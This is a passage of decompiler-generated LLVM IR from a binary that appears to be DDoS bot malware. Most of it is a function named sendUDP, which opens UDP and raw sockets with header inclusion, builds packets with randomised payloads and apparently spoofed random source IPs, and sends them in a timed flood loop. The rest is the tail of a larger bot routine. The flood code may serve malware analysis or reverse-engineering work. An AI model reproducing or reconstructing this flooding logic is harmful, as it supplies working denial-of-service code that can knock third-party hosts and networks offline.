  %stack_var_-228.1 = phi i32 [ %stack_var_-228.262, %dec_label_pc_804a01f ], [ %stack_var_-228.262, %dec_label_pc_804b35f ], [ %stack_var_-228.262, %dec_label_pc_804b389 ], [ %stack_var_-228.262, %dec_label_pc_804b2eb ], [ %stack_var_-228.262, %dec_label_pc_804b245 ], [ %stack_var_-228.262, %dec_label_pc_804b218 ], [ %stack_var_-228.262, %dec_label_pc_804b19d ], [ %stack_var_-228.262, %dec_label_pc_804b122 ], [ %stack_var_-228.262, %dec_label_pc_804b011 ], [ %stack_var_-228.262, %dec_label_pc_804b089 ], [ %stack_var_-228.262, %dec_label_pc_804afcc ], [ %stack_var_-228.262, %dec_label_pc_804af55 ], [ %stack_var_-228.262, %dec_label_pc_804aebb ], [ %stack_var_-228.262, %dec_label_pc_804ad99 ], [ %stack_var_-228.262, %dec_label_pc_804ad4e ], [ %stack_var_-228.262, %dec_label_pc_804acd8 ], [ %stack_var_-228.262, %dec_label_pc_804ab94 ], [ %stack_var_-228.262, %dec_label_pc_804ac0c ], [ %stack_var_-228.262, %dec_label_pc_804ab49 ], [ %stack_var_-228.262, %dec_label_pc_804aa65 ], [ %v4_804a877, %dec_label_pc_804a9a1 ], [ %v4_804a877, %dec_label_pc_804a956 ], [ %v4_804a877, %dec_label_pc_804a8e0 ], [ %stack_var_-228.262, %dec_label_pc_804a79c ], [ %stack_var_-228.262, %dec_label_pc_804a814 ], [ %stack_var_-228.262, %dec_label_pc_804a724 ], [ %stack_var_-228.262, %dec_label_pc_804a5cd ], [ %stack_var_-228.262, %dec_label_pc_804a5fb ], [ %stack_var_-228.262, %dec_label_pc_804a4c1 ], [ %stack_var_-228.262, %dec_label_pc_804a1cf ], [ %stack_var_-228.262, %dec_label_pc_804a315 ], [ %stack_var_-228.262, %dec_label_pc_804a2de ], [ %stack_var_-228.262, %dec_label_pc_804a1b6 ]
  %stack_var_-224.1 = phi i32 [ %stack_var_-224.264, %dec_label_pc_804a01f ], [ %stack_var_-224.264, %dec_label_pc_804b35f ], [ %stack_var_-224.264, %dec_label_pc_804b389 ], [ %stack_var_-224.264, %dec_label_pc_804b2eb ], [ %stack_var_-224.264, %dec_label_pc_804b245 ], [ %stack_var_-224.264, %dec_label_pc_804b218 ], [ %stack_var_-224.264, %dec_label_pc_804b19d ], [ %stack_var_-224.264, %dec_label_pc_804b122 ], [ %stack_var_-224.264, %dec_label_pc_804b011 ], [ %stack_var_-224.264, %dec_label_pc_804b089 ], [ %stack_var_-224.264, %dec_label_pc_804afcc ], [ %stack_var_-224.264, %dec_label_pc_804af55 ], [ %stack_var_-224.264, %dec_label_pc_804aebb ], [ %stack_var_-224.264, %dec_label_pc_804ad99 ], [ %stack_var_-224.264, %dec_label_pc_804ad4e ], [ %stack_var_-224.264, %dec_label_pc_804acd8 ], [ %stack_var_-224.264, %dec_label_pc_804ab94 ], [ %stack_var_-224.264, %dec_label_pc_804ac0c ], [ %stack_var_-224.264, %dec_label_pc_804ab49 ], [ %stack_var_-224.264, %dec_label_pc_804aa65 ], [ %stack_var_-224.264, %dec_label_pc_804a9a1 ], [ %stack_var_-224.264, %dec_label_pc_804a956 ], [ %stack_var_-224.264, %dec_label_pc_804a8e0 ], [ %v2_804a7b3, %dec_label_pc_804a79c ], [ %v2_804a7b3, %dec_label_pc_804a814 ], [ %stack_var_-224.264, %dec_label_pc_804a724 ], [ %stack_var_-224.264, %dec_label_pc_804a5cd ], [ %stack_var_-224.264, %dec_label_pc_804a5fb ], [ %stack_var_-224.264, %dec_label_pc_804a4c1 ], [ %stack_var_-224.264, %dec_label_pc_804a1cf ], [ %stack_var_-224.264, %dec_label_pc_804a315 ], [ %stack_var_-224.264, %dec_label_pc_804a2de ], [ %stack_var_-224.264, %dec_label_pc_804a1b6 ]
  %v4_804b3cf = add nuw nsw i32 %v1_804a14566, 1
  store i32 %v4_804b3cf, i32* %eax.global-to-local, align 4
  %v5_804b3d8 = icmp slt i32 %v4_804b3cf, %.v2_8049ee0
  br i1 %v5_804b3d8, label %dec_label_pc_804a01f, label %dec_label_pc_804a013

; uselistorder directives
  uselistorder i32 %v4_804b3cf, { 2, 1, 0 }
  uselistorder i32 %stack_var_-224.1, { 1, 0 }
  uselistorder i32 %stack_var_-228.1, { 1, 0 }
  uselistorder i32 %stack_var_-232.1, { 1, 0 }
  uselistorder i32 %stack_var_-236.1, { 1, 0 }
  uselistorder i32 %stack_var_-240.1, { 1, 0 }
  uselistorder i8* %stack_var_-244.1, { 1, 0 }
  uselistorder i8* %stack_var_-248.1, { 1, 0 }
  uselistorder i8* %stack_var_-252.1, { 1, 0 }
  uselistorder i32 %v2_804b028, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i8* %v1_804af49, { 1, 0, 2 }
  uselistorder i32 %v2_804af46, { 1, 0, 2 }
  uselistorder i32 %v0_804aeb4, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804ae09, { 1, 0 }
  uselistorder i32 %v0_804acd1, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804ac6f, { 0, 2, 4, 3, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %v2_804abab, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 %v1_804aa11, { 1, 0 }
  uselistorder i32 %v0_804a8d9, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804a877, { 0, 2, 4, 3, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %v2_804a7b3, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 %v1_804a6d4, { 1, 0 }
  uselistorder i32 %v1_804a702, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v13_804a4e5, { 1, 0 }
  uselistorder i32 %v0_804a4e0, { 2, 0, 1 }
  uselistorder i32 %v0_804a418, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v5_804a413, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804a3c9, { 1, 0 }
  uselistorder i32 %v2_804a3b4, { 1, 0 }
  uselistorder i32 %v0_804a2a3, { 2, 0, 1 }
  uselistorder i32 %v12_804a282, { 1, 0 }
  uselistorder i32 %v0_804a27d, { 2, 0, 1 }
  uselistorder i32 %v1_804a213, { 1, 0 }
  uselistorder i32 %v0_804a1e2, { 2, 0, 1 }
  uselistorder i32* %v3_804a252.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804a11e, { 1, 0 }
  uselistorder i32 %v2_804a0b6, { 0, 2, 1 }
  uselistorder i32 %v2_804a06a, { 2, 0, 1, 4, 3, 5 }
  uselistorder i32 %v6_804a02e, { 6, 5, 4, 3, 2, 1, 8, 7, 9, 0 }
  uselistorder i8* %v4_804a02e, { 25, 26, 21, 22, 23, 24, 17, 18, 19, 20, 14, 15, 16, 11, 12, 13, 8, 9, 10, 5, 6, 7, 1, 2, 3, 4, 0, 27 }
  uselistorder i32 %v2_804a02b, { 0, 39, 38, 1, 37, 36, 2, 3, 46, 45, 44, 4, 43, 42, 5, 41, 6, 40, 7, 54, 53, 8, 52, 51, 50, 9, 49, 48, 47, 10, 11, 61, 60, 12, 59, 58, 14, 57, 56, 13, 55, 15, 66, 65, 16, 64, 63, 62, 17, 18, 73, 72, 19, 71, 70, 21, 69, 68, 20, 67, 22, 78, 77, 76, 75, 74, 23, 24, 90, 89, 25, 88, 87, 86, 85, 26, 84, 83, 82, 81, 80, 79, 27, 103, 102, 101, 100, 99, 98, 97, 96, 95, 28, 94, 29, 93, 30, 92, 31, 91, 32, 35, 33, 34 }
  uselistorder i8* %stack_var_-252.250, { 31, 0, 1, 2, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 4 }
  uselistorder i8* %stack_var_-248.252, { 30, 0, 1, 2, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 4 }
  uselistorder i8* %stack_var_-244.254, { 29, 0, 1, 2, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 4 }
  uselistorder i32 %stack_var_-240.256, { 33, 0, 1, 2, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 6, 5, 4, 3, 9, 8, 7 }
  uselistorder i32 %stack_var_-236.258, { 36, 0, 1, 2, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 19, 17, 14, 13, 12, 11, 10, 9, 6, 5, 4, 3, 8, 7, 18, 16, 21, 20, 15 }
  uselistorder i32 %stack_var_-232.260, { 37, 0, 1, 2, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 18, 16, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 7, 15, 17, 19, 14, 22, 21 }
  uselistorder i32 %stack_var_-228.262, { 38, 0, 1, 2, 37, 36, 35, 34, 33, 32, 31, 28, 26, 25, 23, 22, 21, 18, 16, 14, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 13, 15, 17, 20, 19, 27, 24, 30, 29 }
  uselistorder i32 %stack_var_-224.264, { 37, 0, 1, 2, 36, 35, 34, 33, 32, 31, 30, 27, 24, 23, 22, 20, 19, 18, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 17, 16, 21, 26, 25, 29, 28 }
  uselistorder i32 %v1_804a14566, { 0, 12, 11, 13, 10, 9, 14, 8, 19, 18, 17, 20, 16, 21, 15, 30, 29, 28, 26, 27, 34, 36, 35, 33, 38, 37, 32, 31, 25, 24, 23, 39, 22, 45, 44, 46, 43, 42, 41, 40, 57, 56, 55, 53, 54, 58, 52, 60, 59, 51, 50, 49, 48, 61, 47, 67, 66, 68, 65, 64, 63, 62, 78, 77, 76, 74, 75, 80, 79, 73, 72, 71, 81, 70, 82, 69, 89, 88, 87, 91, 90, 96, 95, 94, 97, 93, 92, 86, 85, 84, 98, 83, 3, 1, 2, 4, 5, 6, 106, 105, 104, 107, 103, 108, 102, 109, 101, 100, 99, 110, 7 }
  uselistorder i32 %v4_804a008, { 1, 0, 2 }
  uselistorder i32 %v2_8049fac, { 1, 0, 2 }
  uselistorder i32 %storemerge579, { 5, 4, 3, 2, 1, 6, 0 }
  uselistorder i32 %v2_8049faf, { 1, 0, 4, 3, 2, 7, 6, 5, 9, 8, 11, 10, 13, 12, 14, 16, 17, 15, 18, 19 }
  uselistorder i32 %v2_8049f88, { 1, 0 }
  uselistorder i32 %v2_8049f6b, { 4, 22, 5, 6, 7, 23, 8, 9, 10, 24, 11, 26, 25, 12, 13, 27, 14, 15, 28, 16, 17, 18, 29, 19, 30, 1, 2, 3, 31, 0, 20, 21 }
  uselistorder i32 %.v2_8049ee0, { 4, 5, 7, 6, 3, 0, 1, 2 }
  uselistorder i32 %v2_8049ee0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-204, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-172, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-180, { 2, 1, 4, 5, 0, 3, 6, 7 }
  uselistorder i32* %stack_var_-184, { 2, 1, 3, 4, 0, 5, 6 }
  uselistorder i32* %stack_var_-188, { 2, 4, 6, 3, 1, 7, 8, 5, 9, 0, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 23, 29, 30, 31, 32, 28, 33, 34, 35, 36, 37, 39, 40, 38, 42, 41, 43, 44, 46, 45, 47, 48, 49, 50, 51, 53, 54, 55, 56, 52, 57, 58, 59, 60, 62, 63, 61, 107, 106, 108, 109, 111, 110, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 126, 125, 127, 128, 129, 64, 65, 66, 67, 68, 69, 71, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 81, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102, 94, 103, 104, 105, 138, 130, 131, 132, 133, 134, 135, 136, 137 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 6, 7, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 233, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 6, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 47, 55, 56, 57, 58, 53, 54, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 72, 73, 71, 74, 77, 75, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 102, 103, 104, 105, 106, 107, 101, 108, 109, 110, 111, 112, 113, 114, 115, 117, 118, 116, 185, 188, 186, 187, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 119, 121, 120, 122, 123, 124, 125, 128, 126, 127, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 168, 181, 182, 183, 230, 231, 232, 184, 237, 234, 235, 236, 240, 238, 239 }
  uselistorder i32 ()* @readUntil, { 2, 1, 0 }
  uselistorder i32 (i32)* @sclose, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0, 5, 4 }
  uselistorder i8 7, { 2, 0, 1 }
  uselistorder i8 6, { 1, 0 }
  uselistorder label %dec_label_pc_804b3cf, { 32, 1, 7, 8, 9, 10, 11, 12, 2, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 28, 29, 5, 30, 31, 6, 24, 25, 26, 4, 27, 0 }
  uselistorder label %dec_label_pc_804b29d, { 1, 0 }
  uselistorder label %dec_label_pc_804adf1, { 1, 0 }
  uselistorder label %dec_label_pc_804a9f9, { 1, 0 }
  uselistorder label %dec_label_pc_804a6bc, { 1, 0 }
  uselistorder label %dec_label_pc_804a685, { 1, 0 }
  uselistorder label %dec_label_pc_804a5cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a387, { 1, 0 }
  uselistorder label %dec_label_pc_804a19f, { 1, 0 }
  uselistorder label %dec_label_pc_804a01f, { 1, 0 }
  uselistorder label %dec_label_pc_804a013, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a013.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8049fa0, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_4()
  %tmp31 = call i16 @__decompiler_undefined_function_4()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_804b3e6 = load i32, i32* @edi, align 4
  %v0_804b3e7 = load i32, i32* @ebx, align 4
  %v12_804b3e8 = ptrtoint i32* %stack_var_-108 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804b3f1 = icmp eq i32 %arg2, 0
  %v1_804b3f5 = icmp eq i1 %v4_804b3f1, false
  br i1 %v1_804b3f5, label %dec_label_pc_804b402, label %dec_label_pc_804b3f7

dec_label_pc_804b3f7:                             ; preds = %entry
  %v1_804b3f7 = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804b41a

dec_label_pc_804b402:                             ; preds = %entry
  %v1_804b405 = urem i32 %arg2, 65536
  store i32 %v1_804b405, i32* %eax.global-to-local, align 4
  %v1_804b40e = call i32 @htons(i32 %v1_804b405)
  br label %dec_label_pc_804b41a

dec_label_pc_804b41a:                             ; preds = %dec_label_pc_804b3f7, %dec_label_pc_804b402
  %v2_804b41d = ptrtoint i32* %stack_var_-68 to i32
  %v15_804b420 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804b420, i32* %eax.global-to-local, align 4
  %v3_804b427 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v3_804b427, i32* %eax.global-to-local, align 4
  %v1_804b42f = icmp eq i32 %v3_804b427, 0
  %v1_804b431 = icmp eq i1 %v1_804b42f, false
  br i1 %v1_804b431, label %dec_label_pc_804b7f5, label %dec_label_pc_804b437

dec_label_pc_804b437:                             ; preds = %dec_label_pc_804b41a
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804b450 = icmp eq i32 %arg4, 32
  %v1_804b454 = icmp eq i1 %v9_804b450, false
  br i1 %v1_804b454, label %dec_label_pc_804b529, label %dec_label_pc_804b45a

dec_label_pc_804b45a:                             ; preds = %dec_label_pc_804b437
  %v3_804b463 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_804b463, i32* %eax.global-to-local, align 4
  %v4_804b46e = icmp eq i32 %v3_804b463, 0
  br i1 %v4_804b46e, label %dec_label_pc_804b7f5, label %dec_label_pc_804b478

dec_label_pc_804b478:                             ; preds = %dec_label_pc_804b45a
  %v1_804b47b = add i32 %arg5, 1
  store i32 %v1_804b47b, i32* %eax.global-to-local, align 4
  %v1_804b480 = call i32 @malloc(i32 %v1_804b47b)
  store i32 %v1_804b480, i32* %eax.global-to-local, align 4
  %v4_804b48b = icmp eq i32 %v1_804b480, 0
  br i1 %v4_804b48b, label %dec_label_pc_804b7f5, label %dec_label_pc_804b495

dec_label_pc_804b495:                             ; preds = %dec_label_pc_804b478
  store i32 %v1_804b47b, i32* %edx.global-to-local, align 4
  %v1_804b49e = inttoptr i32 %v1_804b480 to i8*
  store i32 %v1_804b480, i32* @edi, align 4
  %v1_804b4a3 = and i32 %v1_804b480, -256
  store i32 %v1_804b4a3, i32* %eax.global-to-local, align 4
  %v5_804b4a5 = call i8* @_memset(i8* %v1_804b49e, i32 %v1_804b4a3, i32 %v1_804b47b)
  %v3_804b4ad = call i32 @makeRandomStr(i8* %v1_804b49e, i32 %arg5)
  store i32 %v3_804b4ad, i32* %eax.global-to-local, align 4
  %v2_804b4ba = call i32 @__GI_time(i32* null)
  %v5_804b4c2 = add i32 %v2_804b4ba, %arg3
  store i32 %v5_804b4c2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b4d1

dec_label_pc_804b4d1:                             ; preds = %dec_label_pc_804b505, %dec_label_pc_804b524, %dec_label_pc_804b495
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804b495 ], [ %v4_804b524, %dec_label_pc_804b524 ], [ 0, %dec_label_pc_804b505 ]
  store i32 %v2_804b41d, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v3_804b463, i32* %stack_var_-140, align 4
  %v6_804b4e6 = call i32 @__libc_sendto(i32 %v3_804b463, i32 %v1_804b480, i32 %arg5, i32 0, i32 %v2_804b41d, i32 16)
  store i32 %v6_804b4e6, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804b4f1 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804b4f4 = icmp eq i1 %v15_804b4f1, false
  br i1 %v1_804b4f4, label %dec_label_pc_804b524, label %dec_label_pc_804b4f6

dec_label_pc_804b4f6:                             ; preds = %dec_label_pc_804b4d1
  br i1 %v1_804b3f5, label %dec_label_pc_804b505, label %dec_label_pc_804b4fc

dec_label_pc_804b4fc:                             ; preds = %dec_label_pc_804b4f6
  %v0_804b4fc = load i32, i32* %stack_var_-140, align 4
  %v1_804b4fc = call i32 @rand_cmwc(i32 %v0_804b4fc)
  store i32 %v1_804b4fc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b505

dec_label_pc_804b505:                             ; preds = %dec_label_pc_804b4f6, %dec_label_pc_804b4fc
  %v2_804b50a = call i32 @__GI_time(i32* null)
  store i32 %v2_804b50a, i32* %eax.global-to-local, align 4
  %v8_804b515 = icmp sgt i32 %v2_804b50a, %v5_804b4c2
  br i1 %v8_804b515, label %dec_label_pc_804b7f5, label %dec_label_pc_804b4d1

dec_label_pc_804b524:                             ; preds = %dec_label_pc_804b4d1
  %v4_804b524 = add i32 %stack_var_-84.0, 1
  br label %dec_label_pc_804b4d1

dec_label_pc_804b529:                             ; preds = %dec_label_pc_804b437
  store i32 %v12_804b3e8, i32* %eax.global-to-local, align 4
  %v3_804b537 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_804b537, i32* %eax.global-to-local, align 4
  %v4_804b542 = icmp eq i32 %v3_804b537, 0
  %v1_804b546 = icmp eq i1 %v4_804b542, false
  br i1 %v1_804b546, label %dec_label_pc_804b54d, label %dec_label_pc_804b7f2

dec_label_pc_804b54d:                             ; preds = %dec_label_pc_804b529
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804b559 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804b559, i32* %eax.global-to-local, align 4
  store i32 %v3_804b537, i32* %stack_var_-140, align 4
  %v5_804b564 = call i32 @__GI_setsockopt(i32 %v3_804b537, i32 0, i32 3, i32 %v2_804b559, i32 4)
  store i32 %v5_804b564, i32* %eax.global-to-local, align 4
  %v2_804b56c = icmp slt i32 %v5_804b564, 0
  %v1_804b56e = icmp eq i1 %v2_804b56c, false
  br i1 %v1_804b56e, label %dec_label_pc_804b5ae.preheader, label %dec_label_pc_804b7f2

dec_label_pc_804b5ae.preheader:                   ; preds = %dec_label_pc_804b54d
  br label %dec_label_pc_804b57e

dec_label_pc_804b57e:                             ; preds = %dec_label_pc_804b5ae.preheader, %dec_label_pc_804b57e
  %stack_var_-32.072 = phi i32 [ 50, %dec_label_pc_804b5ae.preheader ], [ %v4_804b5ae, %dec_label_pc_804b57e ]
  %v4_804b5ae = add nsw i32 %stack_var_-32.072, -1
  %v2_804b583 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b583, i32* %eax.global-to-local, align 4
  store i32 %v2_804b583, i32* @ebx, align 4
  %v1_804b58d = call i32 @rand_cmwc(i32 0)
  %v1_804b592 = load i32, i32* @ebx, align 4
  %v2_804b592 = xor i32 %v1_804b592, %v1_804b58d
  store i32 %v2_804b592, i32* @eax, align 4
  %v1_804b598 = call i32 @srand(i32 %v2_804b592)
  store i32 %v1_804b598, i32* @eax, align 4
  %v0_804b5a0 = call i32 @random()
  store i32 %v0_804b5a0, i32* %eax.global-to-local, align 4
  %v1_804b5a6 = call i32 @init_rand(i32 %v0_804b5a0)
  store i32 %v1_804b5a6, i32* %eax.global-to-local, align 4
  %v13_804b5b1 = icmp eq i32 %v4_804b5ae, 0
  %v1_804b5b5 = icmp eq i1 %v13_804b5b1, false
  br i1 %v1_804b5b5, label %dec_label_pc_804b57e, label %dec_label_pc_804b5b7

dec_label_pc_804b5b7:                             ; preds = %dec_label_pc_804b57e
  %v4_804b5b7 = icmp eq i32 %arg4, 0
  %v1_804b5bb = icmp eq i1 %v4_804b5b7, false
  br i1 %v1_804b5bb, label %dec_label_pc_804b5c6, label %dec_label_pc_804b5dc

dec_label_pc_804b5c6:                             ; preds = %dec_label_pc_804b5b7
  %v5_804b5cd = sub i32 32, %arg4
  %v2_804b5d5 = urem i32 %v5_804b5cd, 32
  %v4_804b5d5 = icmp eq i32 %v2_804b5d5, 0
  br i1 %v4_804b5d5, label %bb71, label %bb

bb:                                               ; preds = %dec_label_pc_804b5c6
  %v5_804b5d5 = shl i32 1, %v2_804b5d5
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_804b5c6, %bb
  %v0_804b5d7 = phi i32 [ %v5_804b5d5, %bb ], [ 1, %dec_label_pc_804b5c6 ]
  %v1_804b5d7 = sub i32 0, %v0_804b5d7
  store i32 %v1_804b5d7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b5dc

dec_label_pc_804b5dc:                             ; preds = %dec_label_pc_804b5b7, %bb71
  %storemerge5 = phi i32 [ %v1_804b5d7, %bb71 ], [ 0, %dec_label_pc_804b5b7 ]
  %v1_804b5df = add i32 %arg5, 28
  %v1_804b5eb = add i32 %arg5, 58
  %v2_804b5ee = and i32 %v1_804b5eb, -16
  %v2_804b5f4 = sub i32 %v12_804b3e8, %v2_804b5ee
  %v1_804b5fc = add i32 %v2_804b5f4, 15
  %v2_804b5ff = and i32 %v1_804b5fc, -16
  %v1_804b617 = add i32 %v2_804b5ff, 20
  %v5_804b61a = inttoptr i32 %v1_804b617 to i16*
  %v1_804b620 = add i32 %arg5, 8
  store i32 %v1_804b620, i32* %eax.global-to-local, align 4
  store i32 %v1_804b620, i32* @ebx, align 4
  %v5_804b628 = add i32 %v2_804b5f4, -16
  %v6_804b628 = inttoptr i32 %v5_804b628 to i32*
  store i32 %storemerge5, i32* %v6_804b628, align 4
  %v2_804b62b = call i32 @getRandomIP(i32 %v1_804b5df, i32 %v2_804b5ff)
  store i32 %v2_804b62b, i32* %eax.global-to-local, align 4
  %v0_804b630 = load i32, i32* @esp, align 4
  %v3_804b636 = inttoptr i32 %v0_804b630 to i32*
  store i32 %v2_804b62b, i32* %v3_804b636, align 4
  %v0_804b637 = call i32 @htonl()
  store i32 %v0_804b637, i32* %eax.global-to-local, align 4
  %v0_804b63c = load i32, i32* @esp, align 4
  %v3_804b63f = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804b63f, i32* %edx.global-to-local, align 4
  %v0_804b645 = load i32, i32* @ebx, align 4
  %v2_804b645 = add i32 %v0_804b63c, 8
  %v3_804b645 = inttoptr i32 %v2_804b645 to i32*
  store i32 %v0_804b645, i32* %v3_804b645, align 4
  %v1_804b646 = add i32 %v0_804b63c, 4
  %v2_804b646 = inttoptr i32 %v1_804b646 to i32*
  store i32 17, i32* %v2_804b646, align 4
  %v3_804b648 = inttoptr i32 %v0_804b63c to i32*
  store i32 %v0_804b637, i32* %v3_804b648, align 4
  %v0_804b649 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b649 = add i32 %v0_804b63c, -4
  %v3_804b649 = inttoptr i32 %v2_804b649 to i32*
  store i32 %v0_804b649, i32* %v3_804b649, align 4
  %v5_804b64a = add i32 %v0_804b63c, -8
  %v6_804b64a = inttoptr i32 %v5_804b64a to i32*
  store i32 %v2_804b5ff, i32* %v6_804b64a, align 4
  %v0_804b64d = call i32 @makeIPPacket()
  %v0_804b652 = load i32, i32* @esp, align 4
  %v1_804b65b = urem i32 %v1_804b620, 65536
  store i32 %v1_804b65b, i32* %eax.global-to-local, align 4
  %v2_804b663 = add i32 %v0_804b652, 8
  %v3_804b663 = inttoptr i32 %v2_804b663 to i32*
  store i32 %v1_804b65b, i32* %v3_804b663, align 4
  %v2_804b664 = call i32 @htons(i32 %v1_804b617)
  %v3_804b664 = trunc i32 %v2_804b664 to i16
  %sext6 = mul i32 %v2_804b664, 65536
  %v1_804b66c = sdiv i32 %sext6, 65536
  store i32 %v1_804b66c, i32* %edx.global-to-local, align 4
  store i32 %v1_804b617, i32* %eax.global-to-local, align 4
  %v3_804b671 = add i32 %v2_804b5ff, 24
  %v4_804b671 = inttoptr i32 %v3_804b671 to i16*
  store i16 %v3_804b664, i16* %v4_804b671, align 8
  %v2_804b675 = call i32 @rand_cmwc(i32 %v1_804b617)
  %sext = mul i32 %v2_804b675, 65536
  %v1_804b67a = sdiv i32 %sext, 65536
  store i32 %v1_804b67a, i32* %edx.global-to-local, align 4
  store i32 %v1_804b617, i32* %eax.global-to-local, align 4
  %v1_804b67f = trunc i32 %v1_804b67a to i16
  store i16 %v1_804b67f, i16* %v5_804b61a, align 4
  br i1 %v1_804b3f5, label %dec_label_pc_804b693, label %dec_label_pc_804b688

dec_label_pc_804b688:                             ; preds = %dec_label_pc_804b5dc
  %v2_804b688 = call i32 @rand_cmwc(i32 %v1_804b617)
  store i32 %v2_804b688, i32* %eax.global-to-local, align 4
  %.pre28 = urem i32 %arg2, 65536
  br label %dec_label_pc_804b6ab

dec_label_pc_804b693:                             ; preds = %dec_label_pc_804b5dc
  %v1_804b696 = urem i32 %arg2, 65536
  store i32 %v1_804b696, i32* %eax.global-to-local, align 4
  %v0_804b69b = load i32, i32* @esp, align 4
  %v2_804b69e = add i32 %v0_804b69b, -16
  %v3_804b69e = inttoptr i32 %v2_804b69e to i32*
  store i32 %v1_804b696, i32* %v3_804b69e, align 4
  %v1_804b69f = sext i16 %tmp31 to i32
  %v2_804b69f = call i32 @htons(i32 %v1_804b69f)
  store i32 %v2_804b69f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b6ab

dec_label_pc_804b6ab:                             ; preds = %dec_label_pc_804b688, %dec_label_pc_804b693
  %v1_804b74f.pre-phi = phi i32 [ %.pre28, %dec_label_pc_804b688 ], [ %v1_804b696, %dec_label_pc_804b693 ]
  %storemerge4.in = phi i32 [ %v2_804b688, %dec_label_pc_804b688 ], [ %v2_804b69f, %dec_label_pc_804b693 ]
  %storemerge4 = trunc i32 %storemerge4.in to i16
